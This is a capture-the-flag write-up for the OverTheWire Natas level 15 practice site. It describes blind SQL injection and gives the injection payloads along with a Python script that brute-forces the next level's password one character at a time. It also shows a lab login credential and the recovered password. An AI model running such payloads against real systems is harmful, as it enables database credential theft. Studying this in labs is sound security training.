- This level requires us to gain some knowledge of Blind SQL injection
- We perform blind SQL injection in cases where the results of the SQL query are masked and we can't decide which result is favourable or not
- Here in our case, all the info that we get is that whether the user exists or not, based on some result set
- So I deduced that if we spray the input with different values, we can analyse the behaviour of the application and can possibly figure out the password for the next level
- Hence first I tried the payload to find out whether the user ```natas16``` exists in the database or not, as the password would be present there only
```SQL
" OR (username = "natas16") -- 
```
- This returned the following result in HTML: ```This user exists```
- Now I tried the following payload a few time with differing characters:
```SQL
" OR (username = "natas16"  AND password LIKE BINARY "e%") -- 
```
- For character h, I was able to get the same output again: ```This user exists```
- So I concluded that if I keep on repeating the same approach with the characters getting appended to the guess string, I can figure out the whole password
- The keyword BINARY was required as I was getting some issues without it
- I then wrote a python script that would perform this bruteforce attack for me:
```python
import requests
URL = "http://natas15.natas.labs.overthewire.org/index.php"
CHARACTER_LIST = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
SUCCESS_RESULT = "This user exists"
FAILURE_RESULT = "This user doesn't exist"
HEADERS = {
'Authorization' : 'Basic bmF0YXMxNTpTZHFJcUJzRmN6M3lvdGxOWUVyWlNad2Jsa20wbHJ2eA=='
}
password_str = ""
for i in range(32):
# Since there are only 64 characters in the column, we will be this loop for 64 times only
	for character in CHARACTER_LIST:
		guess_str = password_str + character
		sqli_query = f" \" OR (username = \"natas16\" AND password LIKE BINARY \"{guess_str}%\") -- "
		print(f"Will be sending request with SQLi payload: {sqli_query}")
		data = {'username' : sqli_query}
		r = requests.post(url = URL, data = data, headers = HEADERS)
		response = r.text
		if SUCCESS_RESULT in response:
			print(f"Success result: {SUCCESS_RESULT}")
			print(f"One character found! {character}")
			password_str += character
			print(f"Updated password string is: {password_str}")
			break

print(password_str)
```
- Running this script took a while, but it fetched me the correct password: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo